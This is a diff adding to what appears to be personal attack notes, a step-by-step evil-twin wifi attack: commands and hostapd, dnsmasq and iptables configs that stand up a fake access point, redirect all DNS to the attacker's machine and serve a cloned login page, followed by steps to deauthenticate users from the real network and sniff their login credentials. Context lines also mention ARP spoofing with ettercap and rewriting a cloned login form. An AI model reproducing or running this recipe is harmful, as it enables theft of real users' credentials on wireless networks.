@@ -302,9 +302,68 @@ ettercap -Tq -M arp:remote -i wlan0 ///
     - to do it automaticli open it in Geany copy the href="foldername go to seatch replace and replace it whit href="/foldername click replace all and In Document
     - Make sure that the Usernam Password and Submit buton arr wrapt in Form tag if its not add it manualy: Open Geany open Find search for <input and Log in to locate all the tags to wrap add <form method="post" action="/index.html"></form>
     - Set the Log In button to be a input if its not <input style="copy past the style" type="submit" value="Log In"></input>
-
-
 - Create a fake AP with the same/similar name.
+    - A router broadcasting signal -> use wifi card with hostapd.
+    - A DHCP server to give IPs to clients -> use dnsmasq.
+    - A DNS server to handle dns requests -> use dnsmasq.
+```
+sudo apt install hostapd dnsmasq
+services network-manager stop
+```
+run this .sh 
+```
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+iptables -P FORWARD ACCEPT
+```
+run this dnsmasq.conf
+```
+#Set the wifi interface
+interface=wlan0
+
+#Set the IP range that can be given to clients
+dhcp-range=10.0.0.10,10.0.0.100,8h
+
+#Set the gateway IP address
+dhcp-option=3,10.0.0.1
+
+#Set dns server address
+dhcp-option=6,10.0.0.1
+
+#Redirect all requests to 10.0.0.1
+address=/#/10.0.0.1
+```
+```
+dnsmasq -C dnsmasq.conf
+```
+run this hostapd.conf
+```
+#Set wifi interface
+interface=wlan0
+
+#Set network name
+ssid=royal wifi v2
+
+#Set chennel
+channel=1
+
+#Set driver
+driver=nl80211
+```
+```
+hostapd hostapd.conf -B
+```
+Set the IP for the adapter look at dnsmasq.conf
+```
+ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
+```
+start the apache with the fake login page
+```
+service apache2 start
+```
 - Deauth users to use the fake network with the cloned page.
 - Sniff the login info!
 
